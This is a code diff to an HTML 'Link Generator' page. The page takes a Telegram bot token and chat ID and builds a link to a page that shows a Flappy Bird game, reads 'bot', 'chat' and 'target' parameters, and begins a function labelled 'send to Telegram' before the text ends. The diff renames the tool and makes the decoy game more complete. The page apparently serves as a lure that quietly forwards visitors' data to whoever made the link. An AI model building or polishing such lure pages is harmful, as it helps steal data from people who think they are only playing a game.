@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>RAFF Link Generator ✨</title>
+  <title>Link Generator</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap');
     body{font-family:'Orbitron',sans-serif;background:#000;color:#fff;
@@ -21,7 +21,7 @@
 </head>
 <body>
   <div class="card" id="formCard">
-    <h1>RAFF LINK GENERATOR ✨</h1>
+    <h1> 🔗LINK GENERATOR</h1>
     <label>Bot Token</label>
     <input id="botToken" type="text" placeholder="123456:ABC...">
     <label>Chat ID</label>
@@ -81,16 +81,62 @@
       const CHAT=params.get("chat");
       const TARGET=params.get("target")||"https://example.com";
 
-      // === Game Flappy Bird ===
-      let birdY=150,gravity=0.5,velocity=0,jump=-8;
-      cvs.addEventListener("click",()=>{velocity=jump;});
-      function loop(){
-        ctx.fillStyle="#70c5ce";ctx.fillRect(0,0,cvs.width,cvs.height);
-        velocity+=gravity; birdY+=velocity;
-        ctx.fillStyle="yellow";ctx.fillRect(50,birdY,30,30);
-        requestAnimationFrame(loop);
-      }
-      loop();
+// === Game Flappy Bird lebih lengkap ===
+let frames=0;
+let bird={
+  x:50, y:150, w:30, h:30,
+  gravity:0.5, jump:-8, speed:0
+};
+let pipes=[];
+let gap=90;
+
+cvs.addEventListener("click",()=>{bird.speed=bird.jump;});
+
+function drawBird(){
+  ctx.fillStyle="yellow";
+  ctx.fillRect(bird.x,bird.y,bird.w,bird.h);
+}
+
+function updateBird(){
+  bird.speed+=bird.gravity;
+  bird.y+=bird.speed;
+
+  // batas atas
+  if(bird.y<0){bird.y=0; bird.speed=0;}
+  // batas bawah
+  if(bird.y+bird.h>cvs.height){bird.y=cvs.height-bird.h; bird.speed=0;}
+}
+
+function drawPipes(){
+  ctx.fillStyle="green";
+  for(let p of pipes){
+    ctx.fillRect(p.x,0,50,p.top);
+    ctx.fillRect(p.x,p.top+gap,50,cvs.height);
+  }
+}
+
+function updatePipes(){
+  if(frames%100===0){
+    let top=Math.floor(Math.random()*200)+50;
+    pipes.push({x:cvs.width, top:top});
+  }
+  for(let i=0;i<pipes.length;i++){
+    pipes[i].x-=2;
+    if(pipes[i].x+50<0){pipes.shift();i--;}
+  }
+}
+
+function loop(){
+  ctx.fillStyle="#70c5ce";
+  ctx.fillRect(0,0,cvs.width,cvs.height);
+
+  updateBird(); drawBird();
+  updatePipes(); drawPipes();
+
+  frames++;
+  requestAnimationFrame(loop);
+}
+loop();
 
       // === Kirim ke Telegram ===
       const send=(type,fd)=>{
